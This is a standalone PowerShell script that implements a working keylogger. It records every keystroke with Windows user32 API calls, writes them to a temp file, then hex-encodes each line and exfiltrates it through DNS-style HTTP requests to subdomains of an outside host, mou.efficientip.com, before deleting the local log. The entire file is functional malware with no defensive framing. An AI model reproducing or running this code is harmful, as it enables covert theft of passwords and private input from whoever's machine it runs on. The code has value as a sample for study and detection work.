#requires -Version 2
function Convert-StringToHex ($String) {
    return ([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($String)).split("-") -join "")
}

function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
{
# Signatures for API Calls
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
# load signatures and make members available
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
# create output file
$null = New-Item -Path $Path -ItemType File -Force
try
{
Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
# create endless loop. When user presses CTRL+C, finally-block
# executes and shows the collected key presses
while ($true) {
Start-Sleep -Milliseconds 40
# scan all ASCII codes above 8
for ($ascii = 9; $ascii -le 254; $ascii++) {
# get current key state
$state = $API::GetAsyncKeyState($ascii)
# is key pressed?
if ($state -eq -32767) {
$null = [console]::CapsLock
# translate scan code to real code
$virtualKey = $API::MapVirtualKey($ascii, 3)
# get keyboard state for virtual keys
$kbstate = New-Object Byte[] 256
$checkkbstate = $API::GetKeyboardState($kbstate)
# prepare a StringBuilder to receive input key
$mychar = New-Object -TypeName System.Text.StringBuilder
# translate virtual key
$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
if ($success) 
{
# add key to logger file
[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 

}
}
}
##############################
If (Test-Path $path) {
$raw_content = Get-Content $path

$uriFileName = "uri.txt"

If (Test-Path $uriFileName){ Remove-Item $uriFileName }

$domain = "mou.efficientip.com"
$chunkid = 0
#encoding part


$dest = "tmp.txt"
$http_preffix = "http://"

#test proxy and set if existant
$WebClient = New-Object System.Net.WebClient
$proxyAddr = (get-itemproperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
IF(!([string]::IsNullOrEmpty($proxyAddr))) {
	$WebProxy = New-Object System.Net.WebProxy($proxyAddr,$true)
	$WebClient.Proxy = $WebProxy
}

foreach ($line in $raw_content)
{
	$to_encode = "$chunkid+$line"
	$uri = Convert-StringToHex $to_encode
	
	try {
		IF(!([string]::IsNullOrEmpty($uri))) {
			$randomSTR = -join ((65..90) + (97..122) | Get-Random -Count 5 | %{[char]$_})
			$uri = "$http_preffix$uri.$randomSTR.$domain"
			$nullResult = $WebClient.DownloadString($uri)
		}
	}
	catch [Net.WebException] {
		Write-Host "sent " $uri
	}
	$chunkid++
	
}

Remove-Item $path 
}
###################################


}
}
finally
{
# open logger file in Notepad
#notepad $Path
}
}
# records all key presses until script is aborted by pressing CTRL+C
# will then open the file with collected key codes
Start-KeyLogger
